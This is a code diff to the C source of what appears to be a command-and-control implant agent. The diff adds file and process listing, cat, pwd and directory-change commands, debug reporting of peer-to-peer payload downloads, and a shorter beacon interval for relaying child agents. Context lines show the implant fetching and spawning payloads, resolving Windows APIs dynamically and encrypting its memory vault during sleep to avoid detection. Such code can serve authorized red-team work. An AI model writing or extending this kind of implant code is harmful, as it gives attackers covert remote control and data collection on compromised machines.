@@ -124,15 +124,17 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
-void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
+void agent_post_ext(AgentState *state, TaskInfo *task, char *output, char *success, char *file_browser_blob, char *process_browser_blob) {
 	TaskPostReply reply = { 0 };
 	BOOL result;
 	
 	size_t out_len = MSVCRT$strlen(output);
 	
 	// If the message is short, just send it (this response completes the task).
+	// Structured payloads (file browser / process browser) ride on the
+	// completing response.
 	if (out_len <= MAXIMUM_POST_SIZE) {
-		result = perform_post(state, task, &reply, output, success, TRUE);
+		result = perform_post(state, task, &reply, output, success, TRUE, file_browser_blob, process_browser_blob);
 		
 		#ifdef CELEBI_DEBUG
 		if (result == TRUE && reply.success == 1) {
@@ -152,7 +154,9 @@ void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) 
 			next[j] = output[i+j];
 		}
 		next[next_len] = '\0';
-		result = perform_post(state, task, &reply, next, success, completed);
+		result = perform_post(state, task, &reply, next, success, completed,
+		                      completed ? file_browser_blob : NULL,
+		                      completed ? process_browser_blob : NULL);
 		KERNEL32$VirtualFree(next, 0, MEM_RELEASE);
 		
 		#ifdef CELEBI_DEBUG
@@ -161,6 +165,10 @@ void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) 
 		}
 		#endif
 	}
+}
+
+void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
+	agent_post_ext(state, task, output, success, NULL, NULL);
 }
 
 void agent_sleep(AgentState *state, TaskInfo *task) {
@@ -222,7 +230,9 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
  * A lost relayed reply fails the round trip (see p2p_recv_timeout); retry the
  * whole download a few times before giving up so a transient blip doesn't
  * waste an otherwise-good task. */
-static int agent_download_file(AgentState *state, char *task_id, char *file_uuid, char **buf, size_t *buflen) {
+static void agent_itoa(unsigned long v, char *out);
+
+static int agent_download_file(AgentState *state, TaskInfo *task, char *task_id, char *file_uuid, char **buf, size_t *buflen) {
 	for (int attempt = 0; attempt < 3; attempt++) {
 		UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task_id, file_uuid);
 
@@ -231,6 +241,38 @@ static int agent_download_file(AgentState *state, char *task_id, char *file_uuid
 		int last_next_chunk = 0;
 		while (upload.finished == FALSE) {
 			BOOL result = perform_upload(state, &upload);
+			#ifdef CELEBI_DEBUG
+			{
+				/* Temporary diagnostics: report each upload round trip as a
+				 * non-completing response so the operator can see how far the
+				 * p2p download actually gets. */
+				char tmp[160];
+				char num[24];
+				tmp[0] = '\0';
+				{
+					char *p = tmp;
+					const char *pre = "dbg upload a";
+					for (int i = 0; pre[i] != '\0' && (p - tmp) < 150; i++) { *p++ = pre[i]; }
+					/* attempt digit */
+					*p++ = (char)('0' + attempt);
+					const char *pre2 = " res=";
+					for (int i = 0; pre2[i] != '\0' && (p - tmp) < 150; i++) { *p++ = pre2[i]; }
+					*p++ = result ? '1' : '0';
+					const char *pre3 = " next=";
+					for (int i = 0; pre3[i] != '\0' && (p - tmp) < 150; i++) { *p++ = pre3[i]; }
+					*p = '\0';
+				}
+				agent_itoa((unsigned long)upload.next_chunk, num);
+				{
+					char *p = tmp;
+					while (*p != '\0') { p++; }
+					for (int i = 0; num[i] != '\0' && (p - tmp) < 158; i++) { *p++ = num[i]; }
+					*p = '\0';
+				}
+				TaskPostReply dreply = { 0 };
+				perform_post(state, task, &dreply, tmp, STR(STATUS_SUCCESS), FALSE, NULL, NULL);
+			}
+			#endif
 			if (result == FALSE) {
 				upload.error = TRUE;
 				break;
@@ -275,7 +317,7 @@ void agent_register(AgentState *state, TaskInfo *task) {
 
 	char *buf = NULL;
 	size_t buflen = 0;
-	if (agent_download_file(state, task->id, uuid, &buf, &buflen) != 0) {
+	if (agent_download_file(state, task, task->id, uuid, &buf, &buflen) != 0) {
 		agent_post(state, task, "", STR(STATUS_UPLOAD_FAILED));
 		return;
 	}
@@ -363,7 +405,7 @@ void agent_spawn(AgentState *state, TaskInfo *task) {
 
 	char *buf = NULL;
 	size_t buflen = 0;
-	if (agent_download_file(state, task->id, file, &buf, &buflen) != 0) {
+	if (agent_download_file(state, task, task->id, file, &buf, &buflen) != 0) {
 		agent_post(state, task, "failed to download payload", STR(STATUS_UPLOAD_FAILED));
 		return;
 	}
@@ -807,6 +849,31 @@ void process_task(TaskInfo *task, AgentState *state) {
 		return;
 	}
 	
+	if (MSVCRT$strcmp(task->command, "ls") == 0) {
+		agent_ls(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "ps") == 0) {
+		agent_ps(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "cat") == 0) {
+		agent_cat(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "pwd") == 0) {
+		agent_pwd(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "change") == 0) {
+		agent_change(state, task);
+		return;
+	}
+	
 	#ifdef CELEBI_DEBUG
 	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
 	#endif
@@ -826,6 +893,14 @@ void sleep_mask(AgentState *state) {
 
 	// Apply jitter to the effective sleep for this iteration.
 	int effective_sleep = apply_jitter(state->sleep_time, state->params.callback_jitter);
+
+	// P2P relay cadence: when we hold links (children), keep the beacon short
+	// so their messages (tasking, file downloads) move without waiting for the
+	// full configured interval at every hop. The configured interval still
+	// governs the agent's own pull cadence when it has no children.
+	if (state->link_count > 0 && effective_sleep > P2P_RELAY_SLEEP_SEC) {
+		effective_sleep = P2P_RELAY_SLEEP_SEC;
+	}
 
 	// Mask vault.
 	if (effective_sleep >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
